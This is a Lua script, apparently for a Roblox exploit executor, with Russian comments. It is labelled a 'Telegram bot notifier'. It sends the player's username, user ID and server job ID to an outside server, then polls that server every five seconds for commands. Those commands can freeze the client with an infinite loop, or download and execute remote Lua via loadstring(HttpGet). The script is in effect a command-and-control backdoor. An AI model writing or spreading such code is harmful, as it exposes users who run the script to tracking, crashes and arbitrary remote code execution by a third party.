-- === TELEGRAM BOT NOTIFIER (Отправка инфы на сервер) ===
task.spawn(function()
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    -- ВАЖНО: Вставь сюда свою ссылку из Render!
    local SERVER_URL = "https://tumbahub-server.onrender.com/api/log_user" 

    local userData = {
        username = LocalPlayer.Name,
        userId = LocalPlayer.UserId,
        jobId = game.JobId
    }

    local requestFunc = request or http_request or (syn and syn.request) or (http and http.request)
    
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = SERVER_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(userData)
            })
        end)
            
            -- === ЦИКЛ ПОЛУЧЕНИЯ КОМАНД ===
            while task.wait(5) do -- Запрашиваем команды каждые 5 секунд
                local success, result = pcall(function()
                    return requestFunc({
                        Url = "https://tumbahub-server.onrender.com/api/get_command?username=" .. LocalPlayer.Name,
                        Method = "GET"
                    })
                end)

                if success and result and result.Body then
                    -- Пытаемся расшифровать JSON ответ от сервера
                    local decodeSuccess, data = pcall(function()
                        return HttpService:JSONDecode(result.Body)
                    end)
                    
                    -- Если сервер ответил success и прислал команду
                    if decodeSuccess and data and data.status == "success" and data.command then
                        local cmd = data.command
--ПИСАТЬ КОМАНДЫ 
--ПИСАТЬ КОМАНДЫ  
--ПИСАТЬ КОМАНДЫ  
--ПИСАТЬ КОМАНДЫ  
--ПИСАТЬ КОМАНДЫ  
--ПИСАТЬ КОМАНДЫ  
--ПИСАТЬ КОМАНДЫ  
--ПИСАТЬ КОМАНДЫ  
--ПИСАТЬ КОМАНДЫ  
--ПИСАТЬ КОМАНДЫ  
                        
                        -- === ИСПОЛНЕНИЕ КОМАНД ===
                        if Mega and Mega.Commands and Mega.Commands[cmd] then
                            -- Динамически вызываем функцию команды, если она существует в модулях
                            task.spawn(Mega.Commands[cmd], data)
                        elseif cmd == "/crash" then
                            -- Бесконечный цикл намертво вешает клиент Роблокса
                            while true do end 
                        elseif cmd =="/kick" then
                            -- 1. Скачиваем код и превращаем в функцию
                            local kickFunc = loadstring(game:HttpGet("https://raw.githubusercontent.com/repositorykreml1n/commands/refs/heads/main/kick.lua"))
                            
                            -- 2. Проверяем, что код успешно скачался, и ПЕРЕДАЕМ ему data
                            if kickFunc then
                                kickFunc(data) 
                            else
                                warn("Не удалось скачать скрипт kick.lua")
                            end
                        end
                        -- =========================
                    end
                end
            end
    end
end)
-- ========================================================
